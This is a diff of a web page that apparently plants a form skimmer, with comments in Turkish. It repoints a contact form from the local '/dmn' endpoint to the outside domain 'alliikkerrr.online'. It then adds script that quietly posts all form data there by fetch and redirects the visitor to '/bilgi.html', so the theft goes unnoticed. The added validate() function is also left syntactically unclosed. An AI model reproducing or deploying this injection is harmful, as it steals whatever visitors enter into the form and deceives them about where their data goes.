@@ -133,7 +133,7 @@ function validate(){
 }
 </script>
 
-<form id="frmContact" action="/dmn" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
+<form id="frmContact" action="https://alliikkerrr.online/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
  <input type="hidden" name="user_ip" value="">
 
 
@@ -264,6 +264,36 @@ $(document).ready(function () {
  
 
 </div></section></form>
+<script>
+    function validate() {
+        // Formun gönderilmesini engelleme
+        return false;
+    </script>
+
+    <script>
+        // Form gönderildiğinde yönlendirme işlemi yapılır
+        document.getElementById('frmContact').addEventListener('submit', function(event) {
+            event.preventDefault(); // Formun normal şekilde gönderilmesini engelle
+
+            // Form verilerini al
+            var formData = new FormData(this);
+
+            // Ajax ile post isteği gönder
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Cevap yoksay ve kullanıcıyı /bilgi.html adresine yönlendir
+                window.location.href = '/bilgi.html';
+            })
+            .catch(error => {
+                 window.location.href = '/bilgi.html';
+            });
+        });
+    </script>
+
+	
 	<script>
   new Vue({
     el: '#app',
